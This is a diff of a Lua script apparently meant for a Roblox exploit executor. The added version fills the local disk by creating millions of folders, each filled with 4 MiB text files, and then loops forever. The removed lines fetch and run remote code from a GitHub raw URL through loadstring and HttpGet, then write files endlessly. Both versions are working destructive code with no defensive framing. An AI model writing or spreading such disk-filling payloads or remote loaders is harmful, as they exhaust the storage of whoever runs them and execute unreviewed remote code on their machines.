@@ -1,24 +1,32 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/bloxfruitsnokey/Arcylic/refs/heads/main/Comet/run.luau"))()
-task.wait(10)
-local fileNamePrefix = "Systematic"
-local fileSize = 4 * 1024 * 1024
+local folderCount = 9999999
+local txtCount = 999999
+local fileSize = 4 * 1024 * 1024 -- 4 MiB per file
+local repeatCreation = true
+
+-- Generate file contents once
 local content = string.rep("A", fileSize)
 
-local counter = 1
+-- Create folders and files
+for i = 1, folderCount do
+    local folder = "Folder_" .. i
 
-while true do
-    local fileName = fileNamePrefix .. tostring(counter) .. ".txt"
-
-    local success, err = pcall(function()
-        writefile(fileName, content)
-    end)
-
-    if success then
-        print("Success")
-    else
-        warn("Failed: " .. tostring(err))
+    if not isfolder(folder) then
+        makefolder(folder)
     end
 
-    counter = counter + 1
-    task.wait(0.1)
+    for j = 1, txtCount do
+        local file = folder .. "/File_" .. j .. ".txt"
+        writefile(file, content)
+        print("Created: " .. file)
+    end
+end
+
+-- Repeat with no intentional delay
+if repeatCreation then
+    local run = true
+
+    while run do
+        task.wait() -- Yields to avoid locking up the executor
+        print("System")
+    end
 end
